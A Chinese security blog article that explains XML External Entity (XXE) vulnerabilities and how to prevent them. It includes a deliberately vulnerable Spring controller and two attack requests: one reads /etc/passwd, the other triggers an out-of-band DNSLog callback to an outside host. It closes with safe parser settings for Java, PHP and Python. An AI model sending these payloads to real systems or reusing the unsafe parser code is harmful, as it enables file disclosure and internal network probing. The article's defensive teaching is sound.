#  防范XXE漏洞：XXE攻击详解与应对策略   
原创 todobest  SDL安全   2025-01-02 11:48  
  
# 一、XXE 漏洞概述  
  
XML（可扩展标记语言）是一种用于标记电子文件的结构化语言，它能够对数据进行标记并定义数据类型。XML允许用户自定义标记语言，因此在数据交换和存储中被广泛使用。  
## 1.1 XML 文档结构  
  
XML文档的基本结构包括以下几个部分：  
1. XML 声明 ：指定 XML 的版本和编码方式。  
  
1. DTD（文档类型定义） ：可选部分，定义 XML 文档的合法构建模块，可以在文档内部声明，也可以外部引用。  
  
1. 文档元素 ：具体数据的组织和标记。  
  
## 1.2 XXE 漏洞及其危害  
  
XXE（XML External Entity）漏洞是一个严重的安全漏洞。当应用程序允许 XML 引用外部实体时，恶意用户可以构造特定内容，从而导致以下危害：  
1. 读取系统上的任意文件。  
  
1. 执行系统命令。  
  
1. 探测内网端口，获取网络信息。  
  
1. 进行针对内网网站的攻击。  
  
# 二、漏洞示例  
## 2.1 示例代码  
  
如下代码主要功能是接收XML内容，通过XML解析器将其解析为DOM对象，并最终将该DOM对象转换为字符串进行返回。代码并没有对XML内容的安全性检验。  
```
import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RequestBody;import org.springframework.web.bind.annotation.RestController;import org.w3c.dom.Document;import javax.xml.parsers.DocumentBuilder;import javax.xml.parsers.DocumentBuilderFactory;import javax.xml.transform.OutputKeys;import javax.xml.transform.Transformer;import javax.xml.transform.TransformerFactory;import javax.xml.transform.dom.DOMSource;import javax.xml.transform.stream.StreamResult;import java.io.ByteArrayInputStream;import java.io.IOException;import java.io.StringWriter;@RestControllerpublic class XmlController {    @PostMapping("/parse-xml")    public String parseXml(@RequestBody String xmlContent) {        try {            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();            DocumentBuilder builder = factory.newDocumentBuilder();            Document doc = builder.parse(new ByteArrayInputStream(xmlContent.getBytes()));            // 打印 Document 的内容            return convertDocumentToString(doc);        } catch (Exception e) {            return"Error parsing XML: " + e.getMessage();        }    }    // 将 Document 转换为字符串    private String convertDocumentToString(Document doc) {        try {            TransformerFactory transformerFactory = TransformerFactory.newInstance();            Transformer transformer = transformerFactory.newTransformer();            transformer.setOutputProperty(OutputKeys.OMIT_XML_DECLARATION, "no");            transformer.setOutputProperty(OutputKeys.INDENT, "yes");            StringWriter writer = new StringWriter();            transformer.transform(new DOMSource(doc), new StreamResult(writer));            return writer.getBuffer().toString();        } catch (Exception e) {            return"Error converting Document to String: " + e.getMessage();        }    }}
```  
## 2.2 接口请求  
- 如下是发送的请求包，读取本地文件  
  
```
POST /parse-xml HTTP/1.1Host: localhost:8000Content-Type: application/xmlContent-Length: 159<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [  <!ENTITY xxe SYSTEM "file:///etc/passwd"> <!-- 读取本地文件的示例 -->]><foo>&xxe;</foo>
```  
- 接口返回的内容![](https://mmbiz.qpic.cn/mmbiz_jpg/RjLIsDJd9EJlCzZj0Tf0GVzvxArAHxTPFCVicriaSgxxX8EDNcEMvUEhHVEkHBmb5euNXEzltb8NrUV0NYuV7svQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
- 如下请求，探测地址，本次请求，使用DNSLog探测  
  
```
POST /parse-xml HTTP/1.1Host: localhost:8000Content-Type: application/xmlContent-Length: 176<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [  <!ENTITY xxe SYSTEM "http://6223dbe1.log.dnslog.sbs/"> <!-- 这里可以替换为任意 URL -->]><foo>&xxe;</foo>
```  
- 发现服务器请求了这个域名地址（可以用于内部端口探测）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RjLIsDJd9EJlCzZj0Tf0GVzvxArAHxTPM3lwBicfuuvHTkEDbRgib8bU0jLGdTK2YwKiauuRH9NmTdNgHb561PaeQ/640?wx_fmt=png&from=appmsg "")  
# 三、修复建议  
1. 使用开发语言提供的禁用外部实体的方法。确保在解析XML前禁用DTD（文档类型定义）和禁止外部实体的解析。  
  
1. 过滤用户提交的XML数据，特别是对于嵌入XML或DTD的输入，进行严格的验证和过滤，确保它们不包含对外部实体或不安全的结构的引用。  
  
## 3.1 Java代码示例  
```
// bad@RequestMapping("/xxe")public void test(String xmlstr) throws  IOException {    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();    try {        InputStream is = new ByteArrayInputStream(xmlstr.getBytes());        DocumentBuilder builder = factory.newDocumentBuilder();        builder.parse(is);    } catch (Exception e) {        e.printStackTrace();    }}// good@RequestMapping("/no_xxe")public void test(String xmlstr) throws  IOException {    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();    try {        // 禁用DTD、禁止外部实体解析        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);        InputStream is = new ByteArrayInputStream(xmlstr.getBytes());        DocumentBuilder builder = factory.newDocumentBuilder();        builder.parse(is);    } catch (Exception e) {        e.printStackTrace();    }}
```  
## 3.2 PHP代码示例  
```
// good：加载XML前，禁用实体解析libxml_disable_entity_loader(true);$$xml = simplexml_load_string($$xmlContent);
```  
## 3.3 Python代码示例  
```
// good 禁用外部实体from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```  
# 四、总结  
  
在当今网络安全形势日益严峻的环境中，XXE（XML External Entity）漏洞作为一种常见的XML解析安全问题，得到了越来越多的关注。 首先，XXE漏洞利用了XML解析器在处理外部实体时的安全缺陷，攻击者可以通过精心构造的XML文档，读取系统内部敏感文件、执行任意命令，甚至进行内部网络探测。一旦系统遭到攻击，可能导致数据泄露、服务中断甚至更为严重的后果，因此，了解并防范XXE漏洞非常重要。 针对这一漏洞，禁用DTD及外部实体的解析是最直接且有效的方式。此外，通过严格的输入验证和过滤，提升解析器的安全性，也能有效降低潜在的风险。作为开发者，理解如何安全地处理XML数据，不仅仅是编写代码的一部分，更是保护用户数据和维护系统安全的重要责任。  
  
参考文档  
- XML 语法 https://www.runoob.com/xml/xml-syntax.html  
  
- DTD 教程 https://www.runoob.com/dtd/dtd-tutorial.html  
  
- XMLReader https://docs.oracle.com/javase/8/docs/api/org/xml/sax/XMLReader.html  
  
  
  
  
